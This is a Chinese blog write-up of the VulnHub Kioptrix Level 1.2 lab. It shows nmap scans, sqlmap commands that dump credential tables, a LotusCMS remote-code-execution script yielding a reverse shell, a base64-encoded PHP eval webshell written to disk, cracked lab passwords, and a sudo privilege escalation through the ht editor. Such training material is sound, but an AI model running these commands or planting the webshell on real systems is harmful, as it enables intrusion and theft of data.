@@ -1,0 +1,324 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/395H1Zrwur9yFHiVIQIBwA)
+
+![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/1brjUjbpg5woLxm1R7bkgS0xELvt3I75r1nOjBycGwcBqCoO4AtB7FQNfiasb7z3JWibPtaeZussh9jnKKmOECmg/640?wx_fmt=png)
+
+点击上方 “信安前线” 可订阅
+
+**0x01** Introduction
+---------------------
+
+虚拟机下载页面：https://download.vulnhub.com/kioptrix/KVM3.rar
+
+Description
+
+```
+It's been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.
+
+After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.
+
+As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…
+
+Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com
+
+Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:
+
+# localhost name resolution is handled within DNS itself.
+#   127.0.0.1 localhost
+#   ::1 localhost127.0.0.1 static3.cdn.ubi.com
+192.168.1.102 kioptrix3.com
+Under Linux that would be /etc/hosts
+
+There’s a web application involved, so to have everything nice and properly displayed you really need to this.
+
+Hope you enjoy Kioptrix VM Level 1.2 challenge.
+```
+
+**0x02 Writeup**
+----------------
+
+#### 1 主机发现与信息收集
+
+##### 1.1 端口信息扫描
+
+nmap 扫描开放端口
+
+```
+root@kali:~# root@kali:~# nmap --script=vuln -p 22,80 192.168.14.153
+ Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-26 03:17 EDT
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_ Hosts are all up (not vulnerable).
+ Nmap scan report for 192.168.14.153
+ Host is up (0.00016s latency).
+ 
+ PORT   STATE SERVICE
+ 22/tcp open  ssh
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 80/tcp open http
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /phpmyadmin/: phpMyAdmin
+ |   /cache/: Potentially interesting folder
+ |   /core/: Potentially interesting folder
+ |   /icons/: Potentially interesting folder w/ directory listing
+ |   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
+ |_ /style/: Potentially interesting folder
+ | http-slowloris-check:
+ |   VULNERABLE:
+ |   Slowloris DOS attack
+ |     State: LIKELY VULNERABLE
+ |     IDs: CVE:CVE-2007-6750
+ |       Slowloris tries to keep many connections to the target web server open and hold
+ |       them open as long as possible. It accomplishes this by opening connections to
+ |       the target web server and sending a partial request. By doing so, it starves
+ |       the http server's resources causing Denial Of Service.
+ |
+ |     Disclosure date: 2009-09-17
+ |     References:
+ |       http://ha.ckers.org/slowloris/
+ |_     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-trace: TRACE is enabled
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRiceTIibOThEzbl9f5VSjico9qic1sCbc2J7Wpf6mkv1RuuiacWFsPYfZh7XQ/640?wx_fmt=png)
+
+##### 1.2 主机漏洞信息扫描  
+
+nmap 漏洞脚本库：
+
+```
+root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --is-dba --dbs --users --current-db
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --tables -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --columns -T "dev_accounts,gallarific_users" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --dump -C "id,username,password" -T "dev_accounts" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --dump -C "username,password" -T "gallarific_users" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --passwords
+```
+
+##### 1.3 web 应用方面
+
+应用版本信息：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicoicXCvN4676ayaMyNAjRgpEXBDwaPicmJeXR6j9s6LE6dz8t61W2YABQ/640?wx_fmt=png)
+
+目录扫描：  
+
+```
+ Scanned items (coverage report)
+ http://192.168.14.153/
+ http://192.168.14.153/cache/
+ http://192.168.14.153/core/
+ http://192.168.14.153/core/controller/
+ http://192.168.14.153/core/lib/
+ http://192.168.14.153/core/view/
+ http://192.168.14.153/gallery
+ http://192.168.14.153/gallery/
+ http://192.168.14.153/gallery/db.sql
+ http://192.168.14.153/gallery/gadmin/
+ http://192.168.14.153/gallery/gadmin/gallarific.css
+ http://192.168.14.153/gallery/gadmin/gallarific.js
+ http://192.168.14.153/gallery/gadmin/images/
+ http://192.168.14.153/gallery/gadmin/index.php
+ http://192.168.14.153/gallery/gadmin/settings.php
+ http://192.168.14.153/gallery/login.php
+ http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid
+ http://192.168.14.153/gallery/themes/
+ http://192.168.14.153/gallery/themes/black/
+ http://192.168.14.153/gallery/themes/black/images/
+ http://192.168.14.153/gallery/themes/blue/
+ http://192.168.14.153/gallery/themes/blue/images/
+ http://192.168.14.153/gallery/themes/default/
+ http://192.168.14.153/gallery/themes/default/images/
+ http://192.168.14.153/gallery/themes/red/
+ http://192.168.14.153/gallery/themes/red/images/
+ http://192.168.14.153/icons/
+ http://192.168.14.153/icons/README
+ http://192.168.14.153/icons/README.html
+ http://192.168.14.153/icons/small/
+ http://192.168.14.153/index.php
+ http://192.168.14.153/modules/
+ http://192.168.14.153/modules/Backup/
+ http://192.168.14.153/modules/Backup/readme.txt
+ http://192.168.14.153/modules/Blog/
+ http://192.168.14.153/modules/Blog/function.include
+ http://192.168.14.153/modules/Blog/htaccess.txt
+ http://192.168.14.153/modules/Dashboard/
+ http://192.168.14.153/modules/FileManager/
+ http://192.168.14.153/modules/Menu/
+ http://192.168.14.153/modules/Nicedit/
+ http://192.168.14.153/modules/TinyMCE
+ http://192.168.14.153/modules/TinyMCE/
+ http://192.168.14.153/modules/lrte/
+ http://192.168.14.153/phpmyadmin/
+ http://192.168.14.153/phpmyadmin/Documentation.html
+ http://192.168.14.153/phpmyadmin/changelog.php
+ http://192.168.14.153/phpmyadmin/docs.css
+ http://192.168.14.153/phpmyadmin/index.php
+ http://192.168.14.153/phpmyadmin/js/
+ http://192.168.14.153/phpmyadmin/license.php
+ http://192.168.14.153/phpmyadmin/main.php
+ http://192.168.14.153/phpmyadmin/phpmyadmin.css.php
+ http://192.168.14.153/phpmyadmin/print.css
+ http://192.168.14.153/phpmyadmin/scripts/
+ http://192.168.14.153/phpmyadmin/scripts/setup.php
+ http://192.168.14.153/phpmyadmin/themes/
+ http://192.168.14.153/phpmyadmin/themes/original/
+ http://192.168.14.153/phpmyadmin/themes/original/img/
+ http://192.168.14.153/phpmyadmin/translators.html
+ http://192.168.14.153/style/
+ http://192.168.14.153/style/admin.php
+ http://192.168.14.153/style/comps/
+ http://192.168.14.153/style/comps/admin/
+ http://192.168.14.153/style/comps/admin/css/
+ http://192.168.14.153/style/comps/admin/css/global.css
+ http://192.168.14.153/style/comps/admin/css/install.css
+ http://192.168.14.153/style/comps/admin/css/login.css
+ http://192.168.14.153/style/comps/admin/images/
+ http://192.168.14.153/style/comps/admin/img/
+ http://192.168.14.153/style/comps/admin/js/
+ http://192.168.14.153/style/comps/admin/js/jquery.corner.js
+ http://192.168.14.153/style/comps/admin/js/jquery.js
+ http://192.168.14.153/style/comps/grey/
+ http://192.168.14.153/style/comps/grey/css/
+ http://192.168.14.153/style/comps/grey/css/style.css
+ http://192.168.14.153/style/comps/grey/images/
+```
+
+发现敏感路径 gallery、phpmyadmin、style 目录。其中存在 3 个登陆页面，其中 cms 系统为 **LotusCMS**
+
+```
+ http://192.168.14.153/index.php?system=Admin
+ http://192.168.14.153/gallery/gadmin/settings.php
+ http://192.168.14.153/phpmyadmin/index.php
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRic4fKYKpTeicCONhGuy7yl9rIQeuu6Z56o7ZEiaf7tYl9EU6cm3yc8g6sg/640?wx_fmt=png)
+
+#### 2 Flag 获取  
+
+##### 2.1 getshell
+
+###### 2.1.1 cms 通用漏洞
+
+信息收集发现 cms 为 LotusCMS ，搜索网上此 cms 漏洞
+
+```
+ root@kali:~# searchsploit LotusCMS
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicNx6I2cF3JxKQgiakmVK09InFXF3IY04kBiaSWKMdz8PrntkbKQicXib8Rg/640?wx_fmt=png)
+
+存在 msf 的 rce 漏洞，搜索 github 上利用代码 (https://github.com/Hood3dRob1n/LotusCMS-Exploit)  
+
+```
+ root@kali:~/LotusCMS-Exploit-master# ./lotusRCE.sh
+ root@kali:~/LotusCMS-Exploit-master# ./lotusRCE.sh 192.168.14.153 /
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicicNQriauIdBtHViacMry8CbNMQ21uvLkibTdYBOKNf6LDyoQrMNNpY9iadQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRiclDz55M2bMdfucpHxxticXZfkbUlFvLLkzamyKM20b5Oht4BsSn8kkBw/640?wx_fmt=png)
+
+成功反弹 shell，当前权限为 www-data，操作系统为 ubuntu 8.04.3TLS，内核版本为 2.6.24-24
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicurqPbfWvK1LTMbTPvuadj0kEPu9nBLJs8bMaUczncdNbgmIoMxSn9g/640?wx_fmt=png)
+
+由于 kioptrix3.com 文件夹只有 root 权限可写，当前 www-data 权限无写入，所以无法写入 webshell。发现 gallery/photos 目录下存在可写直接写 webshell  
+
+```
+ python -c 'import pty;pty.spawn("/bin/sh")'
+ cd /home/www/kioptrix3.com/gallery/photos/
+ echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+ |base64 -d >a.php
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicC0VEoucRoCboicfvO8Mq4snrMVf6FTTBUvZpBwbGiar99s9yo9OINtxA/640?wx_fmt=png)
+
+http://192.168.14.153/gallery/photos/a.php  
+
+###### 2.1.2 sql 注入
+
+发现 http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid 存在 sql 注入
+
+```
+root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --is-dba --dbs --users --current-db
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --tables -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --columns -T "dev_accounts,gallarific_users" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --dump -C "id,username,password" -T "dev_accounts" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --dump -C "username,password" -T "gallarific_users" -D "gallery"
+ root@kali:~# sqlmap -u "http://192.168.14.153/gallery/gallery.php?id=1&sort=photoid" -p id --dbms=mysql --passwords
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicIaVDqSt1ABqiadiba8N93ye01ribt04IJ6PUJsgiaChW0EjOlR7314pOQg/640?wx_fmt=png)  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicIaVDqSt1ABqiadiba8N93ye01ribt04IJ6PUJsgiaChW0EjOlR7314pOQg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicK8FKicPwnxC0z7thm4RvtXMcK4hmYJmyOEiaMyjyDfEyiaHz3odiaNK4Dw/640?wx_fmt=png)
+
+登陆 gallery 后台无法 getshell；爆破出 mysql 数据库 root 账户密码为 fuckeyou，登陆 phpmyadmin 页面尝试 getshell。尝试破解另外 2 个口令  
+
+<table width="800"><thead><tr cid="n66" mdtype="table_row"><th>用户</th><th>密文</th><th>明文</th></tr></thead><tbody><tr cid="n70" mdtype="table_row"><td>dreg</td><td>0d3eccfb887aabd50f243b3f155c0f85</td><td>Mast3r</td></tr><tr cid="n74" mdtype="table_row"><td>loneferret</td><td>5badcaf789d3d1d09794d8f021f40f0e</td><td>starwars</td></tr></tbody></table>
+
+服务器 22 端口开放，尝试组合用户名、密码字典口令猜解
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRichevc6NdRIaVIHOStTyNUVtN8fSRwhNPibewsBpJujlaYiaNZk5kNpG4Q/640?wx_fmt=png)
+
+登陆测试  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicndqhhSibxPSbxgZWzBOmqNZia7Wqt3qzIxTktQNVOgKaQYiam2mvlhq1w/640?wx_fmt=png)
+
+getshell  
+
+```
+ loneferret@Kioptrix3:/var/www$ cd /home/www/kioptrix3.com/gallery/photos/
+ loneferret@Kioptrix3:/home/www/kioptrix3.com/gallery/photos$ echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+ |base64 -d >b.php
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRicgP2HVw3mvXkS4bAJUibzuYTtOdUCKdN0qb77ty3Th9FHQO4TsPNAeAA/640?wx_fmt=png)
+
+http://192.168.0.8/gallery/photos/b.php  
+
+##### 2.2 权限提升
+
+未找到内核可本地提权 exp，将重心放到登陆账号上。查找 sudo 权限
+
+```
+  sudo -l
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRic0fF5FML6Bl1lRcViaWUSjWZmvrUGXiaywPg3Lpibic9s2rgicIMg0KJ380A/640?wx_fmt=png)
+
+发现 ht 编辑器，适用 sudo 提权  
+
+```
+ oneferret@Kioptrix3:~$ export TERM=xterm-color
+ loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRic4NYlX2n4ricRGZadFv03A37p5Dt1qn9jWmjAxvrbj4934DKiajV6CfTw/640?wx_fmt=png)
+
+```
+ loneferret@Kioptrix3:~$ sudo /bin/bash
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQTrAVb5OqtkGYyTJf0jCxRic9LvFssQb0qgZMn5VNXwoROiaSIicEYRYAhLdlIJ3XyO28Vge66cyl2tw/640?wx_fmt=png)
+
+##### **PS：后面 vulnhub 将作为一个系列……**  
+
+更多精彩
+
+*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
+    
+*   [vulnhub 之 KIOPTRIX: LEVEL 1.1 (#2) 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486948&idx=1&sn=d583da8dcbe5ebb30c4465249d27648f&chksm=fcfc30b2cb8bb9a4c6df336aac432ca33901eddda22c85796d1825ad62e39ba8b51211af6f22&scene=21#wechat_redirect)  
+    
+*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
+    
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)
+
+**如果感觉文****章不错，分享让更多的人知道吧！**
